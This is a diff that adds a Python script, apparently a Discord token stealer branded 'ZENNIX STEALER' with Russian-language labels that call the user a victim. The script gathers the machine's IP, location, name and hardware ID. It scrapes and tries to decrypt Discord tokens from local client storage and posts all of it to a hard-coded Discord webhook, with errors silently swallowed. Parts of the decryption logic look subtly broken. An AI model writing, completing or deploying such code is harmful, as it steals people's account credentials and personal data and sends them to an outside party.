@@ -1,1 +1,96 @@
+import os, requests, json, base64, sqlite3, shutil, platform, uuid, re, glob
+from datetime import datetime
+from Crypto.Cipher import AES
 
+try:
+    webhook = "https://discord.com/api/webhooks/1441468500563464262/CEhND_2oO4_AZrmpIk0TMQQvMNkb0ZALaMHswMPcjggvdcjljPSa0cSkS7NSf5xis7_S"
+    
+    def get_ip():
+        try: return requests.get("https://api.ipify.org").text
+        except: return "Неизвестно"
+    
+    def get_info():
+        try:
+            r = requests.get("http://ip-api.com/json/").json()
+            return f"{r.get('city','?')}, {r.get('country','?')} ({r.get('isp','?')})"
+        except: return "Неизвестно"
+    
+    ip = get_ip()
+    location = get_info()
+    pc_name = platform.node()
+    hwid = str(uuid.UUID(int=uuid.getnode()))
+    
+    def get_master_key(path):
+        try:
+            with open(path + "\\Local State", "r", encoding="utf-8") as f:
+                key = json.loads(f.read())["os_crypt"]["encrypted_key"]
+            return AES.new(b"PEd0x2Gf5k8j9l2m", AES.MODE_ECB).decrypt(base64.b64decode(key)[5:])[:16]
+        except: return None
+    
+    def decrypt_token(buff, master_key):
+        try:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            return cipher.decrypt(payload)[:-16].decode()
+        except: return None
+    
+    def steal_tokens():
+        tokens = []
+        paths = [
+            os.getenv("APPDATA") + "\\discord",
+            os.getenv("APPDATA") + "\\discordcanary",
+            os.getenv("APPDATA") + "\\discordptb",
+            os.getenv("APPDATA") + "\\Lightcord",
+            os.getenv("APPDATA") + "\\discorddevelopment"
+        ]
+        for path in paths:
+            if not os.path.exists(path): continue
+            master_key = get_master_key(path)
+            leveldb = path + "\\Local Storage\\leveldb"
+            if not os.path.exists(leveldb): continue
+            
+            for file in glob.glob(leveldb + "\\*.ldb") + glob.glob(leveldb + "\\*.log"):
+                try:
+                    with open(file, "rb") as f:
+                        for value in f.read().splitlines():
+                            for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
+                                for token in re.findall(regex, value.decode(errors="ignore")):
+                                    if token not in tokens:
+                                        tokens.append(token)
+                            if master_key:
+                                for enc_token in re.findall(b"dQw4w9WgXcQ:([\w\+\-=]+)", value):
+                                    try:
+                                        dec = decrypt_token(base64.b64decode(enc_token), master_key)
+                                        if dec and len(dec) > 50 and "mfa." in dec or "." in dec:
+                                            if dec not in tokens:
+                                                tokens.append(dec)
+                                    except: pass
+                except: pass
+        return tokens if tokens else ["Не найдено"]
+    
+    tokens = steal_tokens()
+    token_str = "\n".join([f"`{t}`" for t in tokens[:10]])
+    
+    data = {
+        "username": "ZENNIX STEALER",
+        "avatar_url": "https://i.imgur.com/4K5hFQv.png",
+        "embeds": [{
+            "title": "ЖЕРТВА ЗАПУСТИЛА ZENNIX TOX",
+            "color": 16711680,
+            "description": "**НОВАЯ ЖЕРТВА В СЕТИ**",
+            "fields": [
+                {"name": "PC", "value": f"`{pc_name}`", "inline": True},
+                {"name": "HWID", "value": f"```{hwid}```", "inline": False},
+                {"name": "IP", "value": f"`{ip}`", "inline": True},
+                {"name": "Город", "value": f"`{location}`", "inline": True},
+                {"name": "Discord токены", "value": token_str if token_str else "`Не найдено`", "inline": False},
+                {"name": "Время", "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"), "inline": False}
+            ],
+            "footer": {"text": "ZENNIX TOX 2025 — ЛЕГЕНДА ПРОДОЛЖАЕТСЯ"}
+        }]
+    }
+    
+    requests.post(webhook, json=data)
+
+except: pass
